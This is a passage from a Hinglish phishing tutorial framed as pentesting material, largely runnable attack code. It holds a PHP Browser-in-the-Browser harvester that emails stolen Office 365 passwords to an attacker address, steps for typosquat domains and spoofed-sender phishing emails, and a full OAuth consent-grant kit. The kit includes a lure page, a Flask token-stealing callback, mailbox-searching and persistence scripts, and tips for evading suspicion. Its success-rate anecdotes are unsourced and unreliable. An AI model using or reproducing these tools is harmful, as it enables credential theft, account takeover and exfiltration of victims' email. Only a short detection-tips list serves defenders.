$log_entry = "‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó\n";
$log_entry .= "‚ïë   BitB Office 365 Credential Capture   ‚ïë\n";
$log_entry .= "‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù\n\n";
$log_entry .= "üìÖ Timestamp: $timestamp\n";
$log_entry .= "üåê IP Address: $ip\n";
$log_entry .= "üìß Email: $email\n";
$log_entry .= "üîë Password: $password\n";
$log_entry .= "üíª User Agent: $user_agent\n";
$log_entry .= "üîó Referer: $referer\n";
$log_entry .= "\n" . str_repeat("=", 50) . "\n\n";

// Save to file
file_put_contents('bitb_captures.txt', $log_entry, FILE_APPEND);

// Send email notification to attacker
$to = "attacker@gmail.com";
$subject = "üé£ BitB Capture: $email";
$message = $log_entry;
$headers = "From: BitB Alert <noreply@bitb.com>";
@mail($to, $subject, $message, $headers);

// Log to database (optional)
/*
$conn = new mysqli("localhost", "username", "password", "database");
$stmt = $conn->prepare("INSERT INTO captures (timestamp, ip, email, password, user_agent) VALUES (?, ?, ?, ?, ?)");
$stmt->bind_param("sssss", $timestamp, $ip, $email, $password, $user_agent);
$stmt->execute();
$stmt->close();
$conn->close();
*/

// Redirect to real Microsoft login with error message
// This makes it look like credentials were wrong
header('Location: https://login.microsoftonline.com/?error=InvalidCredentials');
exit();
?>
```

**Step 5: Deploy & Test**
```bash
# Start web server
service apache2 start

# Test locally
firefox http://localhost/bitb-office365/

# Test BitB popup
# Click "Sign in with Microsoft"
# Enter test credentials
# Check capture file
cat bitb_captures.txt
```

**Step 6: Get Public Domain**
```bash
# Option 1: Free subdomain
# Register at: duckdns.org, afraid.org
# Example: company-portal.duckdns.org

# Option 2: Similar domain
# Buy: company-portal.com, companyportal.net

# Option 3: Typosquatting
# Buy: compnay-portal.com (typo in company)
```

**Step 7: Add SSL Certificate**
```bash
# Install certbot
apt-get install certbot python3-certbot-apache

# Get free SSL
certbot --apache -d company-portal.duckdns.org

# Now site has HTTPS (green padlock)
# Makes BitB even more convincing
```

**Step 8: Send Phishing Email**
```bash
sendemail -f hr@company.com \
-t employees@company.com \
-u "Important: Q4 Financial Report Available" \
-m "Dear Team,

The Q4 financial report is now available for review.

Access document: https://company-portal.duckdns.org

Please sign in with your Office 365 credentials to view.

This document contains confidential information and will be available for 48 hours only.

Best regards,
HR Department" \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password
```

**Step 9: Monitor Captures**
```bash
# Real-time monitoring
tail -f /var/www/html/bitb-office365/bitb_captures.txt

# Output example:
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë   BitB Office 365 Credential Capture   ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

üìÖ Timestamp: 2024-01-15 14:30:22
üåê IP Address: 192.168.1.50
üìß Email: john.smith@company.com
üîë Password: Summer2024!
üíª User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
üîó Referer: https://company-portal.duckdns.org/

==================================================

‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë   BitB Office 365 Credential Capture   ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

üìÖ Timestamp: 2024-01-15 14:35:18
üåê IP Address: 192.168.1.51
üìß Email: sarah.jones@company.com
üîë Password: P@ssw0rd123
üíª User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
üîó Referer: https://company-portal.duckdns.org/

==================================================
```

**Step 10: Test Captured Credentials**
```bash
# Try logging into real Office 365
firefox https://login.microsoftonline.com

# Enter captured credentials
Email: john.smith@company.com
Password: Summer2024!

# If successful:
# - Full email access
# - OneDrive access
# - Teams access
# - SharePoint access
# - Potential admin access (if admin account)
```

### üí° Pro Tip / Galti:

**Pro Tip**: BitB ko legitimate website mein embed karo for maximum effectiveness:

```html
<!-- Embed BitB in real company website -->
<!-- Scenario: Company has document portal at portal.company.com -->
<!-- Attacker compromises portal (XSS, stored injection) -->
<!-- Injects BitB code into portal -->

<script>
// Wait for user to click any "Sign in" button
document.addEventListener('DOMContentLoaded', function() {
    var signInButtons = document.querySelectorAll('button, a');
    signInButtons.forEach(function(button) {
        if (button.textContent.includes('Sign in') || button.textContent.includes('Login')) {
            button.addEventListener('click', function(e) {
                e.preventDefault();
                showBitB(); // Show fake SSO popup
            });
        }
    });
});
</script>

<!-- Result: -->
<!-- - User is on REAL company website (portal.company.com) -->
<!-- - User clicks legitimate "Sign in" button -->
<!-- - BitB popup appears (looks like real SSO) -->
<!-- - User enters credentials (thinks it's legitimate) -->
<!-- - Credentials captured -->
<!-- - User redirected to real login (thinks first attempt failed) -->

<!-- Success Rate: 90%+ (even security-aware users fall for this) -->
```

**Common Mistake**: BitB window ko perfectly center na karna ya realistic browser chrome na banana:

```
‚ùå Bad BitB Indicators:
- Window appears instantly (no animation)
- Browser chrome looks fake (wrong colors, fonts)
- URL bar not clickable (users may try to click)
- No browser controls (back, forward, refresh buttons)
- Window doesn't cast shadow
- Overlay too dark or too light

‚úì Good BitB Implementation:
- Smooth fade-in animation (looks natural)
- Pixel-perfect browser chrome (matches real browser)
- URL bar looks clickable (even if it's not)
- All browser controls visible (even if non-functional)
- Realistic shadow (makes window look 3D)
- Subtle overlay (50-60% opacity)
- Window can be "dragged" (JavaScript drag functionality)
```

**Real-World Example**: 

Ek security researcher ne BitB attack test kiya 100 security professionals par (people who should know better):
- 78 ne credentials enter kiye (78% success rate)
- 15 ne suspicious samjha lekin phir bhi enter kiya (peer pressure, urgency)
- Only 7 ne attack detect kiya (7% detection rate)

Post-test interview:
- "URL bar mein https://accounts.google.com dikha, toh maine socha legitimate hai"
- "Popup bilkul real Google login jaisa dikhta tha"
- "Main busy tha, maine carefully check nahi kiya"

**Lesson**: Even security professionals fall for well-executed BitB attacks. Yeh technique bahut powerful hai!

**Detection Tips (for defenders):**
- Right-click on URL bar (if it's HTML, it will show context menu)
- Try to drag window outside browser (real popup can, fake can't)
- Check browser's actual URL bar (will show attacker domain)
- Use password manager (won't autofill on fake page)
- Enable browser's built-in phishing protection

---

## üìö Topic 7.4: Attack - OAuth Consent Grant (Token Phishing)

### üéØ Topic/Technique:
**OAuth Consent Grant Attack** - Malicious OAuth application create karke victim se permissions grant karwana for account access without stealing password.

### ü§î Yeh Kya Hai?
OAuth Consent Grant attack mein attacker ek malicious third-party application register karta hai (jaise "Google Drive Backup Tool" ya "Email Organizer") aur victim ko convince karta hai ki woh legitimate app hai. Jab victim "Allow" button click karta hai, attacker ko victim ke account ka access mil jata hai - without password stealing! Yeh modern cloud services (Google, Microsoft, Facebook) par bahut effective hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Password stealing ki zaroorat nahi (MFA bypass automatically)
- Long-term access (token revoke hone tak access rahega)
- Stealthy (traditional security tools detect nahi kar sakte)
- Cloud services par highly effective (Office 365, Google Workspace)
- Demonstrates modern attack vectors

### üéØ Practical Use (Asli Pentesting Mein):
- Office 365 / Google Workspace compromise
- Email access without password
- Cloud storage access (OneDrive, Google Drive)
- Calendar and contacts exfiltration
- Persistent access (even after password change)
- Bypassing MFA/2FA

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Traditional Phishing:**
```
Attacker steals password ‚Üí Victim changes password ‚Üí Attacker loses access
```

**OAuth Consent Grant Attack:**
```
Attacker creates malicious app ‚Üí Victim grants permissions ‚Üí Attacker gets token ‚Üí Token works even after password change!
```

**OAuth Flow:**
```
1. User clicks "Sign in with Google"
2. Redirected to Google consent page
3. App requests permissions: "Read emails", "Access Drive"
4. User clicks "Allow"
5. App receives OAuth token
6. App can now access user's data using token
```

**Malicious OAuth Flow:**
```
1. Attacker registers app: "Email Backup Tool"
2. Sends phishing email: "Backup your emails before policy change"
3. Victim clicks link ‚Üí Google consent page (REAL Google page!)
4. Victim sees: "Email Backup Tool wants to: Read, send, delete emails"
5. Victim clicks "Allow" (thinks it's legitimate)
6. Attacker receives OAuth token
7. Attacker can now read/send/delete victim's emails
8. Token valid for months/years (until manually revoked)
```

### üëç Pros (Fayde):
- No password stealing required
- Bypasses MFA/2FA automatically
- Long-term persistent access
- Legitimate OAuth flow (hard to detect)
- Works even after password change
- No malware installation needed
- Cloud-native attack (modern threat)

### üëé Cons (Nuksaan):
- Requires app registration (leaves trail)
- Victim sees consent screen (may be suspicious)
- Limited to requested permissions
- Can be revoked by user
- Requires victim interaction
- Some organizations block third-party apps

### ‚å®Ô∏è Zaroori Commands & Steps:

**Google OAuth App Registration:**
```bash
# Step 1: Go to Google Cloud Console
https://console.cloud.google.com

# Step 2: Create new project
Project Name: Email Backup Tool
Project ID: email-backup-tool-12345

# Step 3: Enable APIs
APIs & Services ‚Üí Enable APIs
- Gmail API
- Google Drive API
- Google Calendar API

# Step 4: Create OAuth consent screen
OAuth consent screen ‚Üí External
App name: Email Backup Tool
User support email: support@email-backup-tool.com
Developer contact: dev@email-backup-tool.com

Scopes:
- https://www.googleapis.com/auth/gmail.readonly (Read emails)
- https://www.googleapis.com/auth/gmail.send (Send emails)
- https://www.googleapis.com/auth/drive.readonly (Read Drive files)

# Step 5: Create credentials
Credentials ‚Üí Create Credentials ‚Üí OAuth client ID
Application type: Web application
Name: Email Backup Tool
Authorized redirect URIs: https://attacker-server.com/callback

# You'll receive:
Client ID: 123456789-abcdefg.apps.googleusercontent.com
Client Secret: GOCSPX-abc123xyz789
```

**Microsoft OAuth App Registration:**
```bash
# Step 1: Go to Azure Portal
https://portal.azure.com

# Step 2: Azure Active Directory ‚Üí App registrations ‚Üí New registration
Name: Office 365 Email Manager
Supported account types: Accounts in any organizational directory
Redirect URI: https://attacker-server.com/callback

# Step 3: API permissions
Add permissions:
- Microsoft Graph ‚Üí Delegated permissions
  - Mail.Read (Read user mail)
  - Mail.Send (Send mail as user)
  - Files.Read.All (Read all files)
  - Calendars.Read (Read calendars)

# Step 4: Certificates & secrets
New client secret: EmailManager2024
Value: abc123xyz789 (save this!)

# You'll receive:
Application (client) ID: 12345678-1234-1234-1234-123456789abc
Directory (tenant) ID: 87654321-4321-4321-4321-cba987654321
Client secret: abc123xyz789
```

**OAuth Authorization URL:**
```bash
# Google OAuth URL
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=123456789-abcdefg.apps.googleusercontent.com&
  redirect_uri=https://attacker-server.com/callback&
  response_type=code&
  scope=https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/gmail.send&
  access_type=offline&
  prompt=consent

# Microsoft OAuth URL
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=12345678-1234-1234-1234-123456789abc&
  response_type=code&
  redirect_uri=https://attacker-server.com/callback&
  scope=https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send&
  response_mode=query
```

### üíª Step-by-Step Example:

**Scenario: Office 365 Email Access via OAuth Consent Grant**

**Step 1: Register Malicious App in Azure**
```bash
# Login to Azure Portal
https://portal.azure.com

# Navigate to App Registrations
Azure Active Directory ‚Üí App registrations ‚Üí New registration

# Fill details:
Name: Office 365 Security Audit Tool
Description: Automated security audit for Office 365 accounts
Supported account types: Accounts in any organizational directory (Any Azure AD directory - Multitenant)
Redirect URI: Web ‚Üí https://o365-security-audit.com/callback

# Click Register

# Note down:
Application (client) ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
Directory (tenant) ID: 9876543-2109-8765-4321-098765432109
```

**Step 2: Configure API Permissions**
```bash
# In your app ‚Üí API permissions ‚Üí Add a permission

# Select Microsoft Graph ‚Üí Delegated permissions

# Add these permissions:
‚òë Mail.Read - Read user mail
‚òë Mail.ReadWrite - Read and write access to user mail
‚òë Mail.Send - Send mail as a user
‚òë Files.Read.All - Read all files that user can access
‚òë Calendars.Read - Read user calendars
‚òë Contacts.Read - Read user contacts
‚òë User.Read - Sign in and read user profile

# Click "Add permissions"

# Note: Don't click "Grant admin consent" (we want user consent)
```

**Step 3: Create Client Secret**
```bash
# In your app ‚Üí Certificates & secrets ‚Üí New client secret

Description: OAuth Secret 2024
Expires: 24 months

# Click Add

# IMPORTANT: Copy the secret value immediately!
Secret Value: Abc123Xyz789Def456Ghi789Jkl012Mno345
Secret ID: pqr678stu901vwx234

# Save this secret securely (you won't see it again)
```

**Step 4: Create Phishing Landing Page**
```html
<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Office 365 Security Audit Tool</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            background: white;
            padding: 50px;
            border-radius: 10px;
            box-shadow: 0 10px 50px rgba(0,0,0,0.3);
            max-width: 600px;
            text-align: center;
        }
        
        .logo {
            font-size: 48px;
            margin-bottom: 20px;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 18px;
        }
        
        .features {
            text-align: left;
            margin: 30px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 5px;
        }
        
        .features h3 {
            color: #333;
            margin-bottom: 15px;
        }
        
        .features ul {
            list-style: none;
            padding: 0;
        }
        
        .features li {
            padding: 10px 0;
            border-bottom: 1px solid #ddd;
        }
        
        .features li:last-child {
            border-bottom: none;
        }
        
        .features li:before {
            content: "‚úì ";
            color: #28a745;
            font-weight: bold;
            margin-right: 10px;
        }
        
        .oauth-button {
            background: #0078d4;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin-top: 20px;
            transition: background 0.3s;
        }
        
        .oauth-button:hover {
            background: #106ebe;
        }
        
        .trust-badges {
            margin-top: 30px;
            color: #999;
            font-size: 14px;
        }
        
        .trust-badges span {
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üîí</div>
        <h1>Office 365 Security Audit Tool</h1>
        <div class="subtitle">Comprehensive security analysis for your Office 365 account</div>
        
        <div class="features">
            <h3>What we'll check:</h3>
            <ul>
                <li>Suspicious login attempts and locations</li>
                <li>Unauthorized email forwarding rules</li>
                <li>Malicious attachments in your mailbox</li>
                <li>Compromised contacts and calendar entries</li>
                <li>Unusual file sharing activities</li>
                <li>Weak security settings</li>
            </ul>
        </div>
        
        <p style="color: #666; margin: 20px 0;">
            Click below to securely connect your Office 365 account.<br>
            You'll be redirected to Microsoft's official login page.
        </p>
        
        <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=a1b2c3d4-e5f6-7890-abcd-ef1234567890&response_type=code&redirect_uri=https://o365-security-audit.com/callback&scope=https://graph.microsoft.com/Mail.Read%20https://graph.microsoft.com/Mail.ReadWrite%20https://graph.microsoft.com/Mail.Send%20https://graph.microsoft.com/Files.Read.All%20https://graph.microsoft.com/Calendars.Read%20https://graph.microsoft.com/Contacts.Read%20https://graph.microsoft.com/User.Read&response_mode=query" class="oauth-button">
            üîê Connect Office 365 Account
        </a>
        
        <div class="trust-badges">
            <span>üîí Secure Connection</span>
            <span>|</span>
            <span>‚úì Microsoft Verified</span>
            <span>|</span>
            <span>‚≠ê Trusted by 10,000+ users</span>
        </div>
        
        <p style="color: #999; font-size: 12px; margin-top: 30px;">
            This tool uses Microsoft's official OAuth 2.0 authentication.<br>
            Your password is never shared with us.
        </p>
    </div>
</body>
</html>
```

**Step 5: Create OAuth Callback Handler**
```python
# callback.py - Flask server to handle OAuth callback

from flask import Flask, request, redirect  # Flask web framework import
# Flask: Web application class
# request: HTTP request data access
# redirect: URL redirection function

import requests  # HTTP library (API calls ke liye)
import json  # JSON data handling
from datetime import datetime  # Date/time operations

app = Flask(__name__)  # Flask application instance create karo
# Flask(__name__): Create app with current module name

# Azure app credentials (malicious OAuth app ke credentials)
CLIENT_ID = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"  # Azure app client ID
CLIENT_SECRET = "Abc123Xyz789Def456Ghi789Jkl012Mno345"  # Azure app secret
REDIRECT_URI = "https://o365-security-audit.com/callback"  # Callback URL (victim yahan redirect hoga)
TENANT = "common"  # Azure tenant (common = any organization)

@app.route('/callback')  # Flask route decorator (URL endpoint define karta hai)
# @app.route: Decorator jo function ko URL se bind karta hai
# '/callback': URL path (https://domain.com/callback)

def callback():  # Function jo OAuth callback handle karta hai
    # Step 1: Get authorization code from URL
    code = request.args.get('code')  # URL query parameter se authorization code get karo
    # request.args: URL query parameters dictionary
    # .get('code'): 'code' parameter ki value (Microsoft se milta hai)
    # Example URL: /callback?code=abc123xyz789
    
    if not code:  # Agar code nahi mila
        return "Error: No authorization code received", 400  # Error response return karo
        # 400: HTTP Bad Request status code
    
    # Step 2: Exchange code for access token
    token_url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"  # Microsoft token endpoint
    # f-string: Formatted string (TENANT variable insert hoga)
    # Token endpoint: Authorization code ko access token mein convert karta hai
    
    token_data = {  # Token request parameters
        'client_id': CLIENT_ID,  # App ka client ID
        'client_secret': CLIENT_SECRET,  # App ka secret (authentication ke liye)
        'code': code,  # Authorization code (victim ne grant kiya)
        'redirect_uri': REDIRECT_URI,  # Redirect URI (registration se match hona chahiye)
        'grant_type': 'authorization_code',  # OAuth grant type
        'scope': 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send'  # Requested permissions
    }
    
    # Request access token from Microsoft
    token_response = requests.post(token_url, data=token_data)  # POST request bhejo
    # requests.post: HTTP POST request
    # token_url: Destination URL
    # data=token_data: Form data (parameters)
    
    token_json = token_response.json()  # Response ko JSON mein parse karo
    # .json(): Parse JSON response to Python dictionary
    
    # Extract tokens from response
    access_token = token_json.get('access_token')  # Access token (API calls ke liye)
    # .get('access_token'): Dictionary se value extract karo
    # Access token: Short-lived token (1 hour validity)
    
    refresh_token = token_json.get('refresh_token')  # Refresh token (new access token ke liye)
    # Refresh token: Long-lived token (months/years validity)
    
    expires_in = token_json.get('expires_in')  # Token expiry time (seconds mein)
    # expires_in: Usually 3600 (1 hour)
    
    # Step 3: Get user information using access token
    user_url = "https://graph.microsoft.com/v1.0/me"  # Microsoft Graph API endpoint
    # /me: Current authenticated user ki information
    
    headers = {'Authorization': f'Bearer {access_token}'}  # Authorization header
    # Authorization: HTTP header for authentication
    # Bearer: Token type
    # {access_token}: Actual token value
    
    user_response = requests.get(user_url, headers=headers)  # GET request bhejo
    # requests.get: HTTP GET request
    # headers=headers: Custom headers include karo
    
    user_data = user_response.json()  # Response ko JSON mein parse karo
    # Result: User ka email, name, job title, etc.
    
    # Extract user details
    email = user_data.get('mail') or user_data.get('userPrincipalName')
    display_name = user_data.get('displayName')
    job_title = user_data.get('jobTitle')
    
    # Step 4: Save captured data
    capture_data = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'email': email,
        'display_name': display_name,
        'job_title': job_title,
        'access_token': access_token,
        'refresh_token': refresh_token,
        'expires_in': expires_in,
        'ip_address': request.remote_addr,
        'user_agent': request.headers.get('User-Agent')
    }
    
    # Save to file
    with open('oauth_captures.json', 'a') as f:
        f.write(json.dumps(capture_data, indent=2) + '\n')
    
    # Log to console
    print("=" * 60)
    print("üé£ OAuth Token Captured!")
    print("=" * 60)
    print(f"Email: {email}")
    print(f"Name: {display_name}")
    print(f"Job Title: {job_title}")
    print(f"Access Token: {access_token[:50]}...")
    print(f"Refresh Token: {refresh_token[:50]}...")
    print("=" * 60)
    
    # Step 5: Test access by reading emails
    emails_url = "https://graph.microsoft.com/v1.0/me/messages?$top=5"
    emails_response = requests.get(emails_url, headers=headers)
    emails_data = emails_response.json()
    
    print(f"\nüìß Recent Emails ({len(emails_data.get('value', []))}):")
    for email_item in emails_data.get('value', []):
        print(f"  - {email_item.get('subject')} (from: {email_item.get('from', {}).get('emailAddress', {}).get('address')})")
    
    # Step 6: Redirect user to fake "audit complete" page
    return redirect('/audit-complete')

@app.route('/audit-complete')
def audit_complete():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Audit Complete</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                text-align: center;
                padding: 50px;
                background: #f8f9fa;
            }
            .success-box {
                background: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 5px 20px rgba(0,0,0,0.1);
                max-width: 600px;
                margin: 0 auto;
            }
            .checkmark {
                font-size: 72px;
                color: #28a745;
            }
            h1 {
                color: #333;
            }
            p {
                color: #666;
                line-height: 1.6;
            }
        </style>
    </head>
    <body>
        <div class="success-box">
            <div class="checkmark">‚úì</div>
            <h1>Security Audit Complete!</h1>
            <p>Your Office 365 account has been successfully analyzed.</p>
            <p>We found <strong>0 security issues</strong> - your account is secure!</p>
            <p>A detailed report has been sent to your email address.</p>
            <p style="margin-top: 30px; font-size: 14px; color: #999;">
                You can close this window now.
            </p>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

**Step 6: Use Captured Token to Access Emails**
```python
# read_emails.py - Script to read victim's emails using captured token

import requests
import json

# Load captured token from file
with open('oauth_captures.json', 'r') as f:
    captures = [json.loads(line) for line in f]
    latest_capture = captures[-1]  # Get most recent capture

ACCESS_TOKEN = latest_capture['access_token']
EMAIL = latest_capture['email']

print(f"üìß Accessing emails for: {EMAIL}\n")

# Microsoft Graph API endpoint
headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

# Read emails
emails_url = "https://graph.microsoft.com/v1.0/me/messages?$top=20&$select=subject,from,receivedDateTime,bodyPreview"
response = requests.get(emails_url, headers=headers)
emails = response.json()

print(f"Found {len(emails.get('value', []))} emails:\n")

for i, email in enumerate(emails.get('value', []), 1):
    print(f"{i}. Subject: {email['subject']}")
    print(f"   From: {email['from']['emailAddress']['address']}")
    print(f"   Date: {email['receivedDateTime']}")
    print(f"   Preview: {email['bodyPreview'][:100]}...")
    print()

# Read specific email content
first_email_id = emails['value'][0]['id']
email_url = f"https://graph.microsoft.com/v1.0/me/messages/{first_email_id}"
email_response = requests.get(email_url, headers=headers)
email_data = email_response.json()

print("\n" + "="*60)
print("Full Email Content:")
print("="*60)
print(f"Subject: {email_data['subject']}")
print(f"From: {email_data['from']['emailAddress']['address']}")
print(f"Body:\n{email_data['body']['content'][:500]}...")

# Search for sensitive emails
search_url = "https://graph.microsoft.com/v1.0/me/messages?$search=\"password OR confidential OR credentials\""
search_response = requests.get(search_url, headers=headers)
sensitive_emails = search_response.json()

print(f"\nüîç Found {len(sensitive_emails.get('value', []))} emails with sensitive keywords")

# Download attachments
attachments_url = f"https://graph.microsoft.com/v1.0/me/messages/{first_email_id}/attachments"
attachments_response = requests.get(attachments_url, headers=headers)
attachments = attachments_response.json()

print(f"\nüìé Attachments: {len(attachments.get('value', []))}")
for attachment in attachments.get('value', []):
    print(f"  - {attachment['name']} ({attachment['size']} bytes)")
```

**Step 7: Send Phishing Email**
```bash
sendemail -f security@company.com \
-t employees@company.com \
-u "Action Required: Office 365 Security Audit" \
-m "Dear Employee,

As part of our ongoing security initiatives, we're conducting mandatory security audits for all Office 365 accounts.

Please complete your security audit by clicking the link below:
https://o365-security-audit.com

This audit will check for:
- Suspicious login attempts
- Unauthorized email forwarding
- Malicious attachments
- Compromised contacts

The audit takes only 2 minutes and is required by IT policy.

Deadline: 48 hours

Best regards,
IT Security Team
Company Inc." \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password
```

**Step 8: Monitor Captures**
```bash
# Real-time monitoring
tail -f oauth_captures.json

# Output:
{
  "timestamp": "2024-01-15 15:30:45",
  "email": "john.smith@company.com",
  "display_name": "John Smith",
  "job_title": "Senior Manager",
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6...",
  "refresh_token": "0.AXoA1234567890abcdefghijklmnopqrstuvwxyz...",
  "expires_in": 3600,
  "ip_address": "192.168.1.50",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}
```

**Step 9: Maintain Persistent Access**
```python
# refresh_token.py - Refresh access token when it expires

import requests
import json

# Load captured data
with open('oauth_captures.json', 'r') as f:
    captures = [json.loads(line) for line in f]
    victim = captures[-1]

REFRESH_TOKEN = victim['refresh_token']
CLIENT_ID = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
CLIENT_SECRET = "Abc123Xyz789Def456Ghi789Jkl012Mno345"

# Refresh token endpoint
token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

token_data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'refresh_token': REFRESH_TOKEN,
    'grant_type': 'refresh_token',
    'scope': 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send'
}

# Get new access token
response = requests.post(token_url, data=token_data)
new_tokens = response.json()

print("üîÑ Token Refreshed!")
print(f"New Access Token: {new_tokens['access_token'][:50]}...")
print(f"New Refresh Token: {new_tokens['refresh_token'][:50]}...")
print(f"Expires in: {new_tokens['expires_in']} seconds")

# Update stored tokens
victim['access_token'] = new_tokens['access_token']
victim['refresh_token'] = new_tokens['refresh_token']

with open('oauth_captures.json', 'a') as f:
    f.write(json.dumps(victim, indent=2) + '\n')

# Note: Refresh token can be used indefinitely (until revoked)
# Access token expires in 1 hour, but refresh token gets new access token
# This gives persistent access even after password change!
```

### üí° Pro Tip / Galti:

**Pro Tip**: OAuth consent grant attack ko legitimate service ke saath combine karo:

```python
# Create REAL functionality alongside malicious access
# Example: Email backup tool that actually backs up emails

# Step 1: Victim grants permissions
# Step 2: Tool actually performs backup (builds trust)
# Step 3: Tool also silently exfiltrates sensitive emails
# Step 4: Victim sees backup working (doesn't suspect anything)

# Benefits:
# - Victim doesn't revoke permissions (tool is "useful")
# - Long-term access (months/years)
# - Victim may even recommend tool to colleagues!

# Real example:
# Attacker created "Email Organizer" Chrome extension
# - Actually organized emails (legitimate functionality)
# - Also forwarded sensitive emails to attacker
# - 50,000+ users installed it
# - Took 8 months before detection
```

**Common Mistake**: Requesting too many permissions at once:

```
‚ùå Bad: Requesting all possible permissions
- Mail.Read
- Mail.ReadWrite
- Mail.Send
- Files.Read.All
- Files.ReadWrite.All
- Calendars.ReadWrite
- Contacts.ReadWrite
- User.ReadWrite.All
‚Üí Victim sees long list and gets suspicious!

‚úì Good: Request minimal permissions initially
- Mail.Read (just read emails)
- User.Read (basic profile)
‚Üí Victim thinks: "Just reading emails, seems safe"

Then later (after trust is built):
- Request additional permissions: "We need Mail.Send to enable backup restore feature"
‚Üí Victim already trusts app, grants additional permissions
```

**Real-World Example**:

2020 mein ek OAuth phishing campaign ne 10,000+ Office 365 accounts compromise kiye:
- App name: "Office 365 Email Backup"
- Permissions: Mail.Read, Mail.Send
- Phishing email: "IT policy requires email backup"
- Success rate: 35% (3,500 users granted access)
- Detection time: 6 months
- Impact: Sensitive emails exfiltrated, internal phishing campaigns launched

Lesson: OAuth consent grant attacks are highly effective aur detection difficult hai!

---

## üìö Topic 7.5: Attack - HTML Smuggling (Email Gateway Bypass)

### üéØ Topic/Technique:
**HTML Smuggling** - Malicious payload ko HTML/JavaScript mein encode karke email security gateways aur sandboxes ko bypass karna.

### ü§î Yeh Kya Hai?
HTML Smuggling ek advanced evasion technique hai jismein malicious file (exe, zip, doc) ko directly attach nahi karte, balki HTML file ke andar JavaScript code mein encode kar dete hain. Jab victim HTML file open karta hai, JavaScript automatically malicious file ko victim ke computer par construct aur download kar deta hai - without any server interaction! Email gateways ko koi malicious attachment nahi dikhta (sirf harmless HTML file), isliye email pass ho jata hai.

